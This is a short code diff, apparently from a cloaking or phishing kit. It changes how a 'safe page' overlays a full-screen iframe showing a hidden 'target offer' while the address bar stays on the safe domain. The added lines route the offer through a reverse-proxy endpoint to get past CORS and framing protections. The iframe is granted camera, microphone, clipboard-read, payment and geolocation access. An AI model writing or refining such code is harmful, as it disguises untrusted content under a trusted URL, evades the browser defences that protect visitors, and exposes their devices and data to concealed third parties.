@@ -511,11 +511,12 @@ serve_safe_page($config);
       var targetPath = payload.destinationUrl.split('#')[0].replace(/\/+$/, '');
       if (currentPath === targetPath || w.location.pathname === targetPath || currentPath.indexOf(targetPath) === 0) return;
 
-      // In-Place Reverse Proxy Delivery: Keep address bar intact on safe page domain
-      if (payload.actionType === 'proxy_target_offer' || payload.actionType === 'rewrite') {
+      var action = (payload.actionType || '').toLowerCase().trim();
+      // In-Place Reverse Proxy Delivery: Keep address bar intact on safe page domain without CORS/framing blocks
+      if (action === 'proxy_target_offer' || action === 'rewrite' || action.indexOf('proxy') !== -1) {
         try {
           var f = d.createElement('iframe');
-          f.src = payload.destinationUrl;
+          f.src = _ep + '/r/_proxy/stream?url=' + encodeURIComponent(payload.destinationUrl);
           f.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;margin:0;padding:0;overflow:hidden;z-index:2147483647;background:#fff;';
           f.setAttribute('allow', 'fullscreen; payment; camera; microphone; geolocation; clipboard-read; clipboard-write');
           f.setAttribute('sandbox', 'allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation');
